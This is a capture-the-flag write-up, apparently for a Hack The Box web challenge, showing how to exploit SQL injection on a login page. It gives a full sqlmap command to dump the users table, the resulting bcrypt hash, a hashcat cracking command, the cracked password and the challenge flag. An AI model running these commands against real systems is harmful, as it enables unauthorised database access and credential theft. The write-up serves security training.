# KORP Terminal

Your faction must infiltrate the KORP™ terminal and gain access to the
Legionaries' privileged information and find out more about the organizers of
the Fray. The terminal login screen is protected by state-of-the-art encryption
and security protocols.

## How to Play

This challenge can be solved either by brute-forcing the login page or by
exploiting a SQL injection vulnerability.

1. Use the given URL in your browser to access the login page.
2. Check `admin'` as username and `admin'` as password. to see if it is
   vulnerable to SQL injection.
3. Since it's vulnerable, use sqlmap to automate the process of exploiting the
   vulnerability. here is the command to use:
   ```bash
    sqlmap -u "94.237.61.21:51335" --data="username=admin&password=admin" --ignore-code 401 -v 6 --dump -T users
    ```
    - `-u` is the URL of the login page.
    - `--data` is the post request data to be sent to the server.
    - `--ignore-code 401` is to ignore the 401 status code. since the server
      returns 401 status code when the username and password are incorrect.
      and we don't want to see the error message.
    - `-v 6` is the verbosity level.
    - `--dump` is to dump the database.
    - `-T users` is to dump the users table. not the whole database.
4. Use the default options for all the questions asked by sqlmap.
    ```
    +----+--------------------------------------------------------------+----------+
    | id | password                                                     | username |
    +----+--------------------------------------------------------------+----------+
    | 1  | $2b$12$OF1QqLVkMFUwJrl1J1YG9u6FdAQZa6ByxFt/CkS/2HW8GA563yiv. | admin    |
    +----+--------------------------------------------------------------+----------+
    ```
5. The password is hashed. use an hash cracker like hashcat to crack the
   password.
   ```bash
    hashcat -m 3200 hash.txt /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt
    ```
    - `-m 3200` is the hash mode. First time run the hashcat without this
      option to see the hash modes available. mode 3200 is the one that makes
        sense.
6. Use '--show' option to see the cracked password.
    ```
    $2b$12$OF1QqLVkMFUwJrl1J1YG9u6FdAQZa6ByxFt/CkS/2HW8GA563yiv.:password123
    ```
7. Use the cracked password to log in to the terminal.

## Flag

```
HTB{t3rm1n4l_cr4ck1ng_sh3n4nig4n5}
```
